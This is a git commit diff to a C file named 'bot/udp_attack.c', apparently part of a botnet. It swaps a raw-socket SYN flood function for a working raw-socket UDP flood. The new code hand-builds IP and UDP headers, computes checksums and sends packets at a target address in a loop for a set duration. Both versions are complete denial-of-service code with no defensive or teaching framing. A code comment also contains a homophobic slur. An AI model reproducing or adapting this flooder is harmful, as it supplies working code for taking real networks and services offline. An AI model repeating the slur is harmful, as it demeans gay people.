4764f4b5e695eb9d67f99bcab8c74c2814910d23
NoSpacesFlies <126734507+NoSpacesFlies@users.noreply.github.com>
2025-05-21 11:17:09 +0300

    Update udp_attack.c
    upload correct file

--- bot/udp_attack.c
+++ bot/udp_attack.c
@@ -1,87 +1,83 @@
-#include "headers/syn_attack.h"
+#define _GNU_SOURCE
+#include "headers/udp_attack.h"
 #include "headers/checksum.h"
 #include <string.h>
 #include <stdlib.h>
 #include <arpa/inet.h>
 #include <netinet/ip.h>
-#include <netinet/tcp.h>
+#include <netinet/udp.h>
 #include <sys/socket.h>
 #include <time.h>
 #include <unistd.h>
 
-void* syn_attack(void* arg) {
+void* udp_attack(void* arg) {
     attack_params* params = (attack_params*)arg;
     if (!params) return NULL;
 
-    int syn_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
-    if (syn_sock < 0) {
+    int udp_sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+    if (udp_sock < 0) {
         return NULL;
     }
 
     int one = 1;
     const int *val = &one;
-    setsockopt(syn_sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));
+    if (setsockopt(udp_sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
+        close(udp_sock);
+        return NULL;
+    }
 
-    int min_packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
-    int packet_size = params->psize > 0 ? params->psize : 40;
-    if (packet_size < min_packet_size) packet_size = min_packet_size;
     static unsigned char *packet = NULL;
     static int last_packet_size = 0;
+    int min_packet_size = sizeof(struct iphdr) + sizeof(struct udphdr);
+    int packet_size = params->psize > 0 ? params->psize : 32;
+    if (packet_size < min_packet_size) packet_size = min_packet_size;
     if (packet == NULL || last_packet_size != packet_size) {
         if (packet) free(packet);
         packet = malloc(packet_size);
         if (!packet) {
-            close(syn_sock);
+            close(udp_sock);
             return NULL;
         }
         memset(packet, 0, min_packet_size);
         last_packet_size = packet_size;
     }
 
-    struct iphdr* iph = (struct iphdr*) packet;
-    struct tcphdr* tcph = (struct tcphdr*) (packet + sizeof(struct iphdr));
+    struct iphdr* iph = (struct iphdr*)packet;
+    struct udphdr* udph = (struct udphdr*)(packet + sizeof(struct iphdr));
 
-    struct sockaddr_in dest;
-    memset(&dest, 0, sizeof(dest));
-    dest.sin_family = AF_INET;
-    dest.sin_port = params->target_addr.sin_port;
-    dest.sin_addr = params->target_addr.sin_addr;
+    struct sockaddr_in dest_addr;
+    memset(&dest_addr, 0, sizeof(dest_addr));
+    dest_addr.sin_family = AF_INET;
+    dest_addr.sin_port = params->target_addr.sin_port;
+    dest_addr.sin_addr = params->target_addr.sin_addr;
 
     iph->ihl = 5;
     iph->version = 4;
     iph->tos = 0;
-    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
+    iph->tot_len = htons(packet_size);
     iph->id = htons(rand() % 65535);
     iph->frag_off = 0;
     iph->ttl = 64;
-    iph->protocol = IPPROTO_TCP;
+    iph->protocol = IPPROTO_UDP;
     iph->saddr = INADDR_ANY;
     iph->daddr = params->target_addr.sin_addr.s_addr;
 
-    tcph->source = htons(params->srcport > 0 ? params->srcport : (rand() % 65535));
-    tcph->dest = params->target_addr.sin_port;
-    tcph->seq = htonl(rand());
-    tcph->ack_seq = 0;
-    tcph->doff = 5;
-    tcph->syn = 1;
-    tcph->ack = 0;
-    tcph->psh = 1;
-    tcph->rst = 0;
-    tcph->fin = 0;
-    tcph->urg = 0;
-    tcph->window = htons(5840);
-    tcph->urg_ptr = 0;
+    udph->source = htons(params->srcport > 0 ? params->srcport : (rand() % 65535));
+    udph->dest = params->target_addr.sin_port;
+    udph->len = htons(packet_size - sizeof(struct iphdr));
+    udph->check = 0;
 
     time_t end_time = time(NULL) + params->duration;
     while (params->active && time(NULL) < end_time) {
         iph->id = htons(rand() % 65535);
         iph->check = generic_checksum((unsigned short*)iph, sizeof(struct iphdr));
-        tcph->check = tcp_udp_checksum(tcph, sizeof(struct tcphdr), iph->saddr, iph->daddr, IPPROTO_TCP);
-        ssize_t sent = sendto(syn_sock, packet, packet_size, 0, (struct sockaddr*)&dest, sizeof(dest));
+        udph->check = tcp_udp_checksum(udph, packet_size - sizeof(struct iphdr), iph->saddr, iph->daddr, IPPROTO_UDP);
+        ssize_t sent = sendto(udp_sock, packet, packet_size, 0, (struct sockaddr*)&dest_addr, sizeof(dest_addr));
         if (sent < 0) break;
     }
-    // Free packet too
+    //free packet too
+    // I accidently replaced wrong file cuz codespaces are g*y
     free(packet);
-    close(syn_sock);
+    close(udp_sock);
     return NULL;
 }
